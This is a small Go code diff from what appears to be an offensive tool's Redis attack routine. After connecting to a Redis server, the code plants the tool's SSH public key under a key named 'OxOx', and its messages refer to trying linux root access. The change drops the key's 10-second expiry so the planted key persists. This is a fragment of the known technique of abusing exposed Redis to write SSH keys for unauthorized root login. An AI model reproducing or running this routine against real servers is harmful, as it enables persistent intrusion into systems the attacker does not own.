@@ -28,7 +28,7 @@ func redisConn(parent context.Context, s *Service, _, pass string) (ok int) {
 				s.parent.Result.ExpHelp = fmt.Sprintf("Try linux root access: '%v' error '%v'\n", ret, err)
 			} else {
 				if _, err := client.Set(ctx,
-					"OxOx", Config.SshPubKey, 10*time.Second).Result(); err != nil {
+					"OxOx", Config.SshPubKey, 0).Result(); err != nil {
 					s.parent.Result.ExpHelp = fmt.Sprintf("Redis attack: error '%v'\n", err)
 					return
 				}
